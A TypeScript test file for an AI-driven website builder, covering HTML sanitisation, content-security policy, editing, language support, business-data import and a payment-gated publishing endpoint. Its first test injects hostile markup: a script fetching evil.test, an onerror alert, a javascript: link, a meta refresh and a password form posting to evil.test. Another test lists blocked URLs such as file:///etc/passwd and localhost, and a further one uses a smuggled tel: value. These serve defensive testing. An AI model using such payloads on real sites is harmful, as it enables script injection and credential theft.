import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, randomUUID } from 'node:crypto';
import { createRequire } from 'node:module';
import { mkdtemp, rm } from 'node:fs/promises';
import path from 'node:path';
import { build } from 'esbuild';
import { load } from 'cheerio';
import sharp from 'sharp';
import { renderCameraSequence } from '../api/_lib/builder-camera-sequence.ts';
import { prepareBuilderHtml, modifyBuilderHtml, builderCsp, builderImageUrl } from '../api/_lib/express-builder-html.ts';
import { previewPrompt } from '../api/_lib/express-claude.ts';
import { BUILDER_DIRECTIONS } from '../src/lib/siteBuilder.ts';
import { CARTA_SECRETA_BUILDER, auditBuilderSite, feedbackForPrompt } from '../api/_lib/atlas-builder-skill.ts';
import { SITE_LANGUAGES, languagePrompt, parseSiteLanguage, normalizeSiteWhatsApp } from '../src/lib/siteLanguages.ts';
import {parseBusinessLink,extractWebsiteBusiness,importBusinessFromUrl,BusinessImportError} from '../api/_lib/builder-business-import.ts';

const origin='https://atlasdigital.ia.br';
const imageUrl=origin+'/api/site-express?view=builder&action=media&id='+randomUUID()+'&file='+randomUUID();
const business={name:'Empresa de teste',segment:'Arquitetura',city:'Porto Alegre, RS',services:'Projetos residenciais',whatsapp:'5551999999999',photo:'',assets:[]};
const raw=`<!doctype html><html><head><title>Empresa</title><style>:root{--atlas-accent:#778899}h1{color:var(--atlas-accent)}</style></head><body><nav><a href="#contato">Contato</a></nav><section id="inicio"><h1>Seu espaço</h1><p>Projeto feito para você.</p><img src="${imageUrl}" alt="Ambiente" data-atlas-parallax="true"></section><section id="servicos"><h2>Serviços</h2></section><section id="sobre"><h2>Sobre</h2></section><section id="contato"><h2>Vamos conversar</h2><a href="https://wa.me/5551999999999?text=Ol%C3%A1">WhatsApp</a></section></body></html>`;

test('generated documents cannot execute model code or leak private reference images',()=>{
 const malicious=raw.replace('</body>','<script>fetch("https://evil.test")</script><iframe src="https://evil.test"></iframe><img onerror="alert(1)" src="'+origin+'/api/site-express?view=builder&action=reference&id=x&file=y"><a href="javascript:alert(1)">Unsafe</a><meta http-equiv="refresh" content="0;url=https://evil.test"><form action="https://evil.test"><input name="password"></form></body>');
 const prepared=prepareBuilderHtml(malicious,origin);const $=load(prepared.html);
 assert.equal($('script').length,1);assert.equal($('iframe,form,input,[onerror]').length,0);assert.equal($('meta[http-equiv=refresh]').length,0);assert.equal($('a').last().attr('href'),'#contato');assert.equal($('img').last().attr('src')||'','');
 const hash=createHash('sha256').update($('script').text()).digest('base64');assert.ok(builderCsp(origin).includes('sha256-'+hash));assert.ok(builderCsp(origin).includes('sha256-D/lkRi3jPMq/ku91QldatjK3JKehjcC6FO+K8sZQSQo='));assert.ok(builderCsp(origin).includes("connect-src 'none'"));assert.equal(prepared.sections.length,4);
 assert.equal(builderImageUrl('https://evil.test/a.jpg',origin),'');assert.equal(builderImageUrl(imageUrl,origin),imageUrl);
});
test('direct edits escape text, preserve IDs and keep only one runtime after repeated saves',()=>{
 let doc=prepareBuilderHtml(raw,origin);const id=doc.sections[0].texts[0].id;
 doc=modifyBuilderHtml(doc.html,{type:'text',id,text:'<script>roubar()</script> & Olá'},origin);assert.equal(doc.sections[0].texts[0].text,'<script>roubar()</script> & Olá');assert.equal(load(doc.html)('script').length,1);
 doc=modifyBuilderHtml(doc.html,{type:'visibility',id:'sobre',visible:false},origin);assert.equal(doc.sections.find(s=>s.id==='sobre')?.visible,false);
 doc=modifyBuilderHtml(doc.html,{type:'color',color:'#123456'},origin);let $=load(doc.html);assert.ok($('#atlas-brand').text().includes('#123456'));assert.equal($('style#atlas-runtime-style').length,1);assert.equal(doc.sections[0].texts[0].id,id);assert.throws(()=>modifyBuilderHtml(doc.html,{type:'text',id:'nope"] script',text:'x'},origin));
});
test('cinematic opening pins two trusted frames and preserves its copy when edited',()=>{
 const asset=(url:string)=>({id:randomUUID(),projectId:'a',kind:'photo' as const,name:'foto',mimeType:'image/webp' as const,width:1400,height:800,size:100,url});
 const second=imageUrl.replace(/file=.+/,'file='+randomUUID());
 const store='https://play.google.com/store/apps/details?id=com.desafiosemdesculpa.app';
 const source=raw.replace('</section>',`<figure class="hero-visual" data-atlas-scene-visual="true" style="background:#352a32"></figure><a href="${store}&amp;from=test">Baixar</a></section>`);
 let doc=prepareBuilderHtml(source,origin,'pt-BR',[asset('https://evil.test/a.jpg'),asset(imageUrl),asset(second)]);
 let $=load(doc.html);
 assert.equal($('#inicio > [data-atlas-shot]').length,1);
 assert.deepEqual($('[data-atlas-shot-media] img').toArray().map(el=>$(el).attr('src')),[imageUrl,second]);
 assert.equal($('[data-atlas-shot-copy] h1').text(),'Seu espaço');
 assert.equal($('[data-atlas-shot-copy] a').attr('href'),store);
 assert.equal($('.hero-visual').attr('data-atlas-shot-decoration'),'true');
 assert.match($('#atlas-runtime-style').text(),/\[data-atlas-shot-copy\] \[data-atlas-shot-decoration\] \{ display:none !important/);
 assert.equal($('#inicio img').length,2);
 assert.match($('#atlas-runtime-style').text(),/animation-timeline:--atlas-opening/);
 doc=modifyBuilderHtml(doc.html,{type:'text',id:doc.sections[0].texts[0].id,text:'Novo destaque'},origin);
 $=load(doc.html);
 assert.equal($('[data-atlas-shot]').length,1);
 assert.equal($('[data-atlas-shot-copy] h1').text(),'Novo destaque');
 assert.equal($('#inicio img').length,2);
});

test('camera opening removes model-authored duplicate media above the canvas',()=>{
 const id=randomUUID(),file=randomUUID();
 const sequence=origin+'/api/site-express?view=builder&action=sequence&id='+id+'&file='+file;
 const source=raw.replace('<h1>Seu espaço</h1>',`<figure class="duplicate" data-atlas-shot-media><img src="${imageUrl}"></figure><h1>Seu espaço</h1>`);
 const photo={id:file,projectId:id,kind:'photo' as const,name:'Foto',mimeType:'image/webp' as const,width:1280,height:720,size:100,url:imageUrl};
 const $=load(prepareBuilderHtml(source,origin,'pt-BR',[photo],null,sequence).html);
 assert.equal($('#inicio [data-atlas-shot-media]').length,1);
 assert.equal($('#inicio .duplicate').length,0);
 assert.equal($('#inicio [data-atlas-shot-media] canvas').length,1);
 assert.equal($('#inicio h1').text(),'Seu espaço');
});

test('cinematic camera changes pose and draws lightning only at the catch',async()=>{
 const photo=(background:string)=>sharp({create:{width:640,height:360,channels:3,background}}).png().toBuffer();
 const base=await photo('#232a35'),pose=await photo('#4e2020');
 const sprite=await renderCameraSequence(base,{action:pose,lightning:true});
 const quiet=await renderCameraSequence(base,{action:pose});
 const frame=(source:Buffer,index:number)=>sharp(source).extract({left:(index%4)*512,top:Math.floor(index/4)*288,width:512,height:288}).removeAlpha().raw().toBuffer();
 const first=await frame(sprite,0),last=await frame(sprite,23);
 assert.ok(first[2]>first[0]);
 assert.ok(last[0]>last[2]*1.8);
 const lit=await frame(sprite,12),plain=await frame(quiet,12);
 assert.ok(lit.some((value,index)=>value>plain[index]+85));
 const quietLast=await frame(quiet,23);
 assert.ok(last.every((value,index)=>Math.abs(value-quietLast[index])<4));
});

test('Carta Secreta applies scene transitions to visual surfaces and keeps CTAs readable',()=>{
 const main=raw.replace('<h2>Serviços</h2>',`<h2>Serviços</h2><a data-atlas-scene-visual="true" href="#contato">Peça orçamento</a><figure><img src="${imageUrl}" alt="Oficina"></figure>`);
 const plan={concept:'Do material ao espaço',heroImagePrompt:'Foto editorial',scenes:[
   {section:'inicio',goal:'Apresentar',entrance:'Close',motion:'Abre o plano',transition:'Segue para a mesma textura',effect:'scroll-zoom' as const,transitionEffect:'match' as const},
   {section:'servicos',goal:'Explicar',entrance:'Plano aberto',motion:'Segue o material',transition:'Revela a equipe',effect:'mask' as const,transitionEffect:'wipe' as const},
   {section:'sobre',goal:'Dar contexto',entrance:'Oficina',motion:'Estático',transition:'Mostra contato',effect:'static' as const,transitionEffect:'cut' as const},
   {section:'contato',goal:'Converter',entrance:'Escrever',motion:'Estático',transition:'Encerrar',effect:'static' as const},
 ]};
 const doc=prepareBuilderHtml(main,origin,'pt-BR',[],plan);
 const $=load(doc.html);
 assert.equal($('#servicos').attr('data-atlas-story-transition'),'match');
 assert.equal($('#servicos figure').attr('data-atlas-story-visual'),'true');
 assert.equal($('#servicos a').attr('data-atlas-story-visual'),undefined);
 assert.equal($('#sobre').attr('data-atlas-story-transition'),'wipe');
 assert.match($('#atlas-runtime-style').text(),/prefers-reduced-motion:no-preference/);
 assert.equal(load(prepareBuilderHtml(doc.html,origin).html)('#servicos').attr('data-atlas-story-transition'),'match');
});
test('relative uploads and absolute generated media both become valid image URLs in the model prompt',()=>{
 const assets=[{id:'a',projectId:'a',kind:'photo' as const,name:'foto',mimeType:'image/webp' as const,width:100,height:100,size:100,url:imageUrl},{id:'b',projectId:'b',kind:'logo' as const,name:'logo',mimeType:'image/png' as const,width:100,height:100,size:100,url:'/api/site-express?view=asset&id=one&asset=two'}];
 const prompt=previewPrompt({...business,assets},{creativePrompt:'',brandColor:'#123456',origin});assert.ok(prompt.user.includes(imageUrl));assert.ok(!prompt.user.includes(origin+origin));assert.ok(prompt.user.includes(origin+'/api/site-express?view=asset'));
});

test('Carta Secreta constrói site final com critérios verificáveis e aprendizagem isolada por ramo',()=>{
 assert.match(CARTA_SECRETA_BUILDER,/CARTA 1/);assert.match(CARTA_SECRETA_BUILDER,/CARTA 4/);
 assert.match(CARTA_SECRETA_BUILDER,/SITE FINAL/);
 const audited=auditBuilderSite(prepareBuilderHtml(raw,origin).html);
 assert.equal(audited.checks.find(c=>c.id==='contato')?.ok,true);
 assert.equal(audited.checks.find(c=>c.id==='titulo')?.ok,false);
 const entries=[{segment:'Arquitetura',rating:'improve',note:'Exibir obras com fotos reais'}, {segment:'Restaurante',rating:'good',note:'Adicionar cardápio'}];
 assert.match(feedbackForPrompt(entries,'Arquitetura'),/Exibir obras/);
 assert.doesNotMatch(feedbackForPrompt(entries,'Arquitetura'),/cardápio/);
});

test('idiomas permitidos, HTML lang e escrita da direita para a esquerda',()=>{
 assert.ok(SITE_LANGUAGES.length>=10);
 assert.equal(parseSiteLanguage('en-GB'),'en-GB');
 assert.equal(parseSiteLanguage('xx-XX'),null);
 assert.equal(normalizeSiteWhatsApp('+1 (416) 555-0123'),'14165550123');
 assert.equal(normalizeSiteWhatsApp('+351 912 345 678'),'351912345678');
 assert.equal(normalizeSiteWhatsApp('(51) 99999-9999'),'5551999999999');
 assert.equal(normalizeSiteWhatsApp('4165550123'),'');
 assert.match(languagePrompt('fr'),/Français/);
 assert.match(languagePrompt('ar'),/RTL/);
 assert.equal(load(prepareBuilderHtml(raw,origin,'en-GB').html)('html').attr('lang'),'en-GB');
 assert.equal(load(prepareBuilderHtml(raw,origin,'ar').html)('html').attr('dir'),'rtl');
 assert.equal(load(prepareBuilderHtml(raw,origin,'ja').html)('html').attr('lang'),'ja');
 assert.equal(load(prepareBuilderHtml(raw,origin).html)('html').attr('lang'),'pt-BR');
 const english=prepareBuilderHtml(raw,origin,'en-US');
 assert.equal(load(modifyBuilderHtml(english.html,{type:'color',color:'#123456'},origin).html)('html').attr('lang'),'en-US');
});


test('importação de site usa dados estruturados e link WhatsApp explícito, sem inventar fatos',()=>{
 const html='<html><head><title>Ateliê Aurora | Arquitetura</title><meta name="description" content="Projetos residenciais modernos e arquitetura de interiores.">'+
 '<script type="application/ld+json">'+JSON.stringify({'@context':'https://schema.org','@type':'LocalBusiness',name:'Ateliê Aurora',category:'Arquitetura',description:'Projetos residenciais e interiores.',address:{addressLocality:'Lisboa',addressCountry:'Portugal'},telephone:'+351 912 345 678'})+'</script></head>'+
 '<body><main><a href="https://wa.me/351912345678">Fale com a empresa</a><h2>Projetos residenciais</h2></main></body></html>';
 const x=extractWebsiteBusiness(html,'https://atelier-aurora.pt/');
 assert.equal(x.business.name,'Ateliê Aurora');assert.equal(x.business.segment,'Arquitetura');
 assert.match(x.business.city,/Lisboa/);assert.match(x.business.services,/Projetos residenciais/);
 assert.equal(x.business.whatsapp,'+351912345678');assert.equal(x.business.phone,'+351 912 345 678');
 assert.equal(x.missing.length,0);
 assert.equal(extractWebsiteBusiness('<html><title>Sem contato</title></html>','https://example.org/').business.whatsapp,'');
});
test('bloqueia URLs internas, credenciais e protocolos inseguros na importação',()=>{
 for(const url of ['http://example.org','https://127.0.0.1/admin','https://localhost/api','https://192.168.1.10/','https://user:pass@example.org/','https://company.local','file:///etc/passwd','https://example.org:444/']){
   assert.throws(()=>parseBusinessLink(url),BusinessImportError,url);
 }
 assert.equal(parseBusinessLink('https://maps.app.goo.gl/abc').kind,'google');
 assert.equal(parseBusinessLink('https://share.google/abc').kind,'google');
 assert.equal(parseBusinessLink('https://www.google.com/maps/place/Studio+Polar/').kind,'google');
 assert.equal(parseBusinessLink('https://www.suaempresa.com').kind,'website');
});
test('a OpenAI pesquisa o perfil, ancora dados em fontes e descarta temas sem fonte',async t=>{
 const previousFetch=globalThis.fetch;
 const previousKey=process.env.OPENAI_API_KEY;
 process.env.OPENAI_API_KEY='fake-secret';
 t.after(()=>{
   globalThis.fetch=previousFetch;
   if(previousKey===undefined) delete process.env.OPENAI_API_KEY;
   else process.env.OPENAI_API_KEY=previousKey;
 });
 const website='https://studiopolar.com.br/';
 const photoSource=website+'projetos';
 const reviews='https://reviews.example.org/studio-polar';
 let verified=true;
 globalThis.fetch=async(input:any,init:any)=>{
   assert.equal(String(input),'https://api.openai.com/v1/responses');
   const body=JSON.parse(init.body);
   assert.match(body.input[0].content[0].text,/Studio\+Polar/);
   assert.deepEqual(body.tools[0].search_content_types,['text','image']);
   assert.equal(body.store,false);
   const facts={verified,name:'Studio Polar',city:'São Paulo, SP',segment:'Estúdio de fotografia',
     address:'Rua das Fotos, 123',contactEmail:'contato@studiopolar.com.br',hours:'Segunda a sexta, 9h às 18h',
     phone:'+55 11 2222-3333',services:'Retratos profissionais e fotografia comercial',
     website,visualDirection:'Luz lateral suave e fundos neutros',reviewThemes:'Elogios ao atendimento',
     factSources:[website],imageSources:[photoSource],reviewSources:[reviews]};
   const annotations=[website,photoSource].map(url=>({type:'url_citation',url,title:'Studio Polar'}));
   return new Response(JSON.stringify({status:'completed',output:[{type:'message',content:[{type:'output_text',text:JSON.stringify(facts),annotations}]}]}));
 };
 const profile='https://www.google.com/maps/place/Studio+Polar/';
 const result=await importBusinessFromUrl(profile);
 assert.equal(result.business.name,'Studio Polar');
 assert.equal(result.business.address,'Rua das Fotos, 123');
 assert.equal(result.business.contactEmail,'contato@studiopolar.com.br');
 assert.equal(result.business.phone,'+55 11 2222-3333');
 assert.equal(result.business.whatsapp,'');
 assert.equal(result.business.businessResearch?.visualDirection,'Luz lateral suave e fundos neutros');
 assert.equal(result.business.businessResearch?.reviewThemes,'');
 assert.deepEqual(result.business.businessResearch?.sources.map(source=>source.url),[website,photoSource]);
 assert.deepEqual(result.missing,[]);
 verified=false;
 await assert.rejects(importBusinessFromUrl(profile),(error:BusinessImportError)=>error.status===422);
});
test('o editor mantém links tel: válidos e bloqueia javascript ou host externo',()=>{
 const document=prepareBuilderHtml(raw.replace('https://wa.me/5551999999999?text=Ol%C3%A1','tel:+351912345678'),origin);
 const $=load(document.html);
 assert.equal($('a[href="tel:+351912345678"]').length,1);
 const unsafe=prepareBuilderHtml(raw.replace('https://wa.me/5551999999999?text=Ol%C3%A1','tel:123;evil'),origin);
 assert.equal(load(unsafe.html)('a[href^="tel:"]').length,0);
 const email=prepareBuilderHtml(raw.replace('https://wa.me/5551999999999?text=Ol%C3%A1','mailto:contato@empresa.com.br'),origin);
 assert.equal(load(email.html)('a[href="mailto:contato@empresa.com.br"]').length,1);
});

// Endpoint integration with in-memory transaction serialization and fake external services.
// No real customer data, API calls or payments are used by this suite.
class MemoryDb {
 data=new Map<string,any>();queue=Promise.resolve();collection=(p:string)=>new Query(this,p);
 async runTransaction(fn:any){const prev=this.queue;let release:()=>void;this.queue=new Promise<void>(resolve=>release=resolve);await prev;try{return await fn({get:(r:any)=>r.get(),getAll:(...refs:any[])=>Promise.all(refs.map(r=>r.get())),create:(r:any,d:any)=>r.create(d),set:(r:any,d:any)=>r.set(d),update:(r:any,d:any)=>r.update(d),delete:(r:any)=>r.delete()});}finally{release!();}}
 batch(){const ops:(()=>any)[]=[];return {create:(r:any,d:any)=>ops.push(()=>r.create(d)),set:(r:any,d:any)=>ops.push(()=>r.set(d)),update:(r:any,d:any)=>ops.push(()=>r.update(d)),commit:async()=>{for(const op of ops)await op();}};}
}
class Ref {
 constructor(public db:MemoryDb,public path:string){}get id(){return this.path.split('/').pop()!;}collection(n:string){return new Query(this.db,this.path+'/'+n);}async get(){const d=this.db.data.get(this.path);return {id:this.id,exists:!!d,data:()=>d};}async create(d:any){if(this.db.data.has(this.path))throw new Error('Already exists');this.db.data.set(this.path,d);}async set(d:any){this.db.data.set(this.path,d);}async update(d:any){const next={...this.db.data.get(this.path)};for(const [key,value]of Object.entries(d)){const parts=key.split('.');let target=next;for(const k of parts.slice(0,-1))target=target[k]={...target[k]};target[parts.at(-1)!]=value;}this.db.data.set(this.path,next);}async delete(){this.db.data.delete(this.path);}
}
class Query {
 filters:any[]=[];sort?:string;max=Infinity;cursor?:string;constructor(public db:MemoryDb,public path:string){}doc(id:string){return new Ref(this.db,this.path+'/'+id);}where(k:string,_op:string,v:any){this.filters.push([k,v]);return this;}orderBy(k:string,_dir?:string){this.sort=k;return this;}startAfter(value:string){this.cursor=value;return this;}limit(n:number){this.max=n;return this;}async get(){let docs=[...this.db.data.entries()].filter(([k,d])=>k.startsWith(this.path+'/')&&k.slice(this.path.length+1).split('/').length===1&&this.filters.every(([f,v])=>d[f]===v)).map(([k,d])=>({id:k.split('/').pop()!,data:()=>d}));if(this.sort){const key=this.sort;docs.sort((a,b)=>typeof a.data()[key]==='string'?String(a.data()[key]).localeCompare(String(b.data()[key])):b.data()[key]-a.data()[key]);if(this.cursor)docs=docs.filter(d=>String(d.data()[key])>this.cursor!);}return{docs:docs.slice(0,this.max)};}
}
async function loadEndpoint(){
 const temp=await mkdtemp(path.join(process.cwd(),'.builder-test-'));const out=path.join(temp,'endpoint.cjs');
 await build({entryPoints:['api/_lib/express-builder.ts'],outfile:out,bundle:true,platform:'node',format:'cjs',packages:'external',logLevel:'silent',plugins:[{name:'fixtures',setup(b){
 b.onResolve({filter:/express-store\.js$|\/radar\.js$|express-assets\.js$|express-claude\.js$|express-openai\.js$|express-builder-ai\.js$/},args=>({path:args.path,namespace:'fixture'}));
 b.onLoad({filter:/.*/,namespace:'fixture'},args=>{let names=args.path.includes('express-store')?['db','previews','settings','orders','orderId','publicOrigin','saoPauloDay','rateLimit']:args.path.includes('radar')?['getAuthenticatedEmail']:args.path.includes('express-assets')?['readExpressAsset','resolveExpressAssets','rasterInfo','ASSET_MAX_BYTES','ExpressAssetError']:args.path.includes('express-claude')?['extractSiteHtml']:args.path.includes('express-openai')?['openaiAccessMessage','openaiConfigured','openaiText','openaiResponse','openaiOutputText']:['researchBuilder','planBuilder','builderPrompt','generateBuilderPhoto','generateDesignMockup'];return {contents:names.map(n=>`export const ${n}=globalThis.__atlasBuilderTest.${n};`).join('\n'),loader:'js'};});
 }}]});
 const require=createRequire(import.meta.url);return {handler:require(out).default,close:()=>rm(temp,{recursive:true,force:true})};
}
test('authenticated endpoint: ownership, reference cap, model input, job retries, versions and payment gate',async t=>{
 const db=new MemoryDb();let generationCalls=0;let modelReferences:any[]=[];let requestedLocale='';let planningCalls=0;let plannedRefs=0;let usedConcept='';let imagePrompt='';let chosenDesign='';let selectedPlanInput='';let imageDesign='';const fixture:any={db:()=>db,previews:()=>db.collection('expressPreviews'),settings:()=>db.collection('expressInternal').doc('settings'),orders:()=>db.collection('expressOrders'),orderId:(v:any)=>typeof v==='string'&&/^[a-f0-9-]{36}$/i.test(v),publicOrigin:()=>origin,saoPauloDay:()=> '2026-11-18',rateLimit:async()=>true,getAuthenticatedEmail:async(req:any,verified=false)=>verified&&req.headers.verified!=='yes'?null:req.headers.authorization||null,readExpressAsset:async()=>({buffer:await sharp({create:{width:640,height:360,channels:3,background:'#b27641'}}).png().toBuffer()}),resolveExpressAssets:async()=>[],rasterInfo:(data:Buffer)=>{assert.equal(data.subarray(1,4).toString(),'PNG');return{mimeType:'image/png',width:1,height:1};},ASSET_MAX_BYTES:750*1024,ExpressAssetError:class extends Error{},openaiAccessMessage:()=>'',openaiConfigured:()=>true,openaiResponse:async()=>({}),openaiOutputText:()=>'',openaiText:async()=>{generationCalls++;return raw;},extractSiteHtml:(s:string)=>s,researchBuilder:async(_business:any,options:any)=>{planningCalls++;plannedRefs=options.references.length;return {sources:[{url:'https://pinterest.com/pin/123/',title:'Editorial',insight:'Abertura focada no material'}],creativePlan:{concept:'Do detalhe ao ambiente',scenes:[],heroImagePrompt:'Foto macro de pedra'},directions:BUILDER_DIRECTIONS,researchNotice:'Uma referência.'};},planBuilder:async(_b:any,_opts:any,_sources:any,visual:any)=>{selectedPlanInput=visual?.data||'';return {concept:'Do detalhe ao ambiente',scenes:[],heroImagePrompt:'Foto macro de pedra'};},builderPrompt:async(_b:any,_d:any,_c:any,_o:any,refs:any[],_inst:any,_html:any,_history:any,_learn:any,locale:string,synopsis:any)=>{modelReferences=refs;requestedLocale=locale;usedConcept=synopsis?.plan?.concept||'';chosenDesign=synopsis?.chosenDesign?.data||'';return{system:'',content:[]};},generateDesignMockup:async()=>({buffer:Buffer.from('mock design'),mimeType:'image/webp'}),generateBuilderPhoto:async(_business:any,prompt:string,_aspect:string,reference:any)=>{imagePrompt=prompt;imageDesign=reference?.isMockup?reference.buffer.toString():'';throw new Error('Fake generator unavailable');}};
 (globalThis as any).__atlasBuilderTest=fixture;const endpoint=await loadEndpoint();
 const call=async(action:string,body:any={},user:string|null='cliente@example.com',method='POST')=>{const r:any={statusCode:200,headers:{},setHeader(k:string,v:any){this.headers[k]=v;},status(n:number){this.statusCode=n;return this;},json(d:any){this.body=d;return this;},send(d:any){this.body=d;return this;},end(){return this;}};await endpoint.handler({method,query:{action,...(method==='GET'?body:{})},body,headers:{...(user?{authorization:user}:{})}},r);return r;};
 try{
 const budget=db.collection('expressBuilderLimits').doc('2026-11-18-generate');
 await budget.set({count:100});
 for(let n=0;n<4;n++){
   const projectId=randomUUID();
   assert.equal((await call('create',{id:projectId,business})).statusCode,200);
   assert.equal((await call('start',{id:projectId,requestId:randomUUID(),type:'generate'})).statusCode,200);
 }
 assert.equal((await budget.get()).data()?.count,100);
 const id=randomUUID();assert.equal((await call('create',{id,business},null)).statusCode,401);
 assert.equal((await call('import-business',{url:'https://www.google.com/maps/place/Studio+Polar/'},null)).statusCode,401);
 assert.equal((await call('import-business',{url:'http://127.0.0.1'})).statusCode,400);const created=await call('create',{id,business,locale:'en-GB'});assert.equal(created.statusCode,200);assert.equal(created.body.project.version,0);assert.equal(created.body.project.locale,'en-GB');
 const importedId=randomUUID();const phoneOnly={...business,whatsapp:'',phone:'+351 912 345 678',website:'https://atelier.pt',sourceUrl:'https://www.google.com/maps/place/Atelier'};
 const importedSite=await call('create',{id:importedId,business:phoneOnly,locale:'pt-PT'});
 assert.equal(importedSite.statusCode,200,JSON.stringify(importedSite.body));assert.equal(importedSite.body.project.business.whatsapp,'');assert.equal(importedSite.body.project.business.phone,'+351 912 345 678');assert.equal(importedSite.body.project.business.sourceUrl,phoneOnly.sourceUrl);assert.equal((await call('language',{id,locale:'invalid'})).statusCode,400);assert.equal((await call('language',{id,locale:'fr'})).body.project.locale,'fr');assert.equal((await call('language',{id,locale:'en-GB'})).body.project.locale,'en-GB');assert.equal((await call('state',{id},'outro@example.com','GET')).statusCode,404);
 const png=Buffer.concat([Buffer.from([137,80,78,71]),Buffer.alloc(64)]).toString('base64');const upload=()=>call('upload-reference',{id,fileId:randomUUID(),name:'Referência de estilo',data:png});const results=await Promise.all([upload(),upload(),upload(),upload(),upload()]);assert.equal(results.filter(r=>r.statusCode===200).length,4);assert.equal(results.filter(r=>r.statusCode===400).length,1);
 const state=await call('state',{id},undefined,'GET');assert.equal(state.body.project.references.length,4);assert.ok(!JSON.stringify(state.body).includes('ownerEmail'));assert.ok(!JSON.stringify(state.body).includes(png));const file=state.body.project.references[0].id;
 assert.equal((await call('reference',{id,file},null,'GET')).statusCode,401);assert.equal((await call('reference',{id,file},'outro@example.com','GET')).statusCode,404);assert.equal((await call('reference',{id,file},undefined,'GET')).statusCode,200);
 // Existing business photo skips automatic image phase; fake media is not published externally.
 const p=db.data.get('expressBuilderProjects/'+id);p.business.assets=[{kind:'photo',id:randomUUID(),url:imageUrl}];const requestId=randomUUID();assert.equal((await call('start',{id,requestId,type:'generate',text:'Use estas referências.'})).statusCode,200);assert.equal((await upload()).statusCode,409);
 const planned=await Promise.all([call('run',{id}),call('run',{id})]);
 assert.equal(planningCalls,1);assert.equal(plannedRefs,4);assert.equal(generationCalls,0);
 const plannedProject=planned.find(r=>r.body.project.creativePlan)?.body.project;
 assert.equal(plannedProject.creativePlan.concept,'Do detalhe ao ambiente');assert.equal(plannedProject.job.phase,'designs');assert.equal(plannedProject.sources.length,1);
 for(let n=0;n<3;n++)assert.equal((await call('run',{id})).statusCode,200);
 const waiting=(await call('state',{id},undefined,'GET')).body.project;
 assert.equal(waiting.awaitingDesign,true);assert.equal(waiting.designOptions.length,3);
 assert.ok(waiting.designOptions.every((option:any)=>option.format==='scroll-storyboard'));
 assert.equal(waiting.job,null);assert.equal(waiting.version,0);
 assert.equal((await call('run',{id})).body.project.version,0);
 const chosen=waiting.designOptions[1].id;
 assert.equal((await call('design',{id,file:chosen},'outro@example.com','GET')).statusCode,404);
 assert.equal((await call('design',{id,file:chosen},undefined,'GET')).body.toString(),'mock design');
 assert.equal((await call('choose-design',{id,optionId:randomUUID()})).statusCode,400);
 assert.equal((await call('choose-design',{id,optionId:chosen})).body.project.job.phase,'selected-planning');
 assert.equal((await call('run',{id})).body.project.job.phase,'sequence');
 assert.equal((await call('run',{id})).body.project.job.phase,'building');
 const camera=await call('sequence',{id,file:requestId},null,'GET');
 assert.equal(camera.headers['Content-Type'],'image/webp');
 assert.equal((await sharp(camera.body).metadata()).width,2048);
 assert.equal((await sharp(camera.body).metadata()).height,1728);
 assert.equal(selectedPlanInput,Buffer.from('mock design').toString('base64'));
 const runs=await Promise.all([call('run',{id}),call('run',{id})]);assert.equal(load(runs.find(r=>r.body.project.version===1).body.project.html)('figure[data-atlas-sequence] > canvas').length,1);assert.equal(generationCalls,1);assert.equal(modelReferences.length,4);assert.equal(chosenDesign,Buffer.from('mock design').toString('base64'));assert.equal(usedConcept,'Do detalhe ao ambiente');assert.equal(requestedLocale,'en-GB');assert.equal(load((await call('state',{id},undefined,'GET')).body.project.html)('html').attr('lang'),'en-GB');assert.equal((await call('language',{id,locale:'fr'})).statusCode,409);assert.equal((await call('state',{id},undefined,'GET')).body.project.version,1);assert.equal((await call('start',{id,requestId,type:'generate'})).body.project.job,null);assert.equal(generationCalls,1);
 await call('start',{id:importedId,requestId:randomUUID(),type:'generate'});
 assert.equal((await call('run',{id:importedId})).body.project.job.phase,'designs');
 for(let n=0;n<3;n++)await call('run',{id:importedId});
 const importedOptions=(await call('state',{id:importedId},undefined,'GET')).body.project.designOptions;
 db.data.get('expressBuilderProjects/'+importedId).media=[{kind:'photo',id:randomUUID(),url:imageUrl}];
 assert.equal((await call('choose-design',{id:importedId,optionId:importedOptions[0].id})).body.project.job.phase,'selected-planning');
 assert.equal((await call('run',{id:importedId})).body.project.job.phase,'images');
 const failedImage=await call('run',{id:importedId});
 assert.match(imagePrompt,/^Foto macro de pedra.*Enquadramento fechado/);
 assert.equal(imageDesign,'mock design');
 assert.equal(failedImage.body.project.job.phase,'sequence');
 assert.equal((await call('run',{id:importedId})).body.project.job.phase,'building');
 assert.match(failedImage.body.project.imageNotice,/Não foi possível criar/);
 assert.equal((await call('run',{id:importedId})).body.project.status,'ready');
 const rebuilt=await call('start',{id:importedId,requestId:randomUUID(),type:'generate',reuseSelectedDesign:true});
 assert.equal(rebuilt.body.project.job.phase,'selected-planning');
 assert.equal(rebuilt.body.project.selectedDesign,importedOptions[0].id);
 assert.equal(rebuilt.body.project.designOptions.length,3);
 assert.equal((await call('run',{id:importedId})).body.project.job.phase,'images');
 const checked=await call('feedback',{id,version:1,rating:'improve',note:'Dar mais destaque ao hero'});assert.equal(checked.statusCode,200);assert.equal(checked.body.project.feedback.rating,'improve');assert.equal((await call('feedback',{id,version:1,rating:'good'},'outro@example.com')).statusCode,404);
 const textId=runs.find(r=>r.body.project.html)?.body.project.sections[0].texts[0].id;
 assert.equal((await call('modify',{id,version:0,operation:{type:'text',id:textId,text:'Wrong'}})).statusCode,409);assert.equal((await call('modify',{id,version:1,operation:{type:'text',id:textId,text:'Novo título'}})).body.project.version,2);assert.equal((await call('restore',{id,version:1})).body.project.version,3);
 assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:randomUUID(),status:'paid',mode:'live'});assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:id,status:'paid',mode:'test'});assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:randomUUID(),status:'paid',mode:'live'});assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:id,status:'paid',mode:'live'});const pub=await call('publish',{id});assert.equal(pub.statusCode,200);assert.ok(pub.body.project.publishedUrl.startsWith(origin+'/s/'));const slug=pub.body.project.publishedUrl.split('/').pop();const publicPage=await call('published',{slug},null,'GET');assert.equal(publicPage.statusCode,200);assert.ok(publicPage.headers['Content-Security-Policy'].includes("frame-ancestors 'none'"));assert.ok(!publicPage.body.includes(png));assert.equal(load(publicPage.body)('html').attr('lang'),'en-GB');
 // Language changes create a new draft version without changing the last published site.
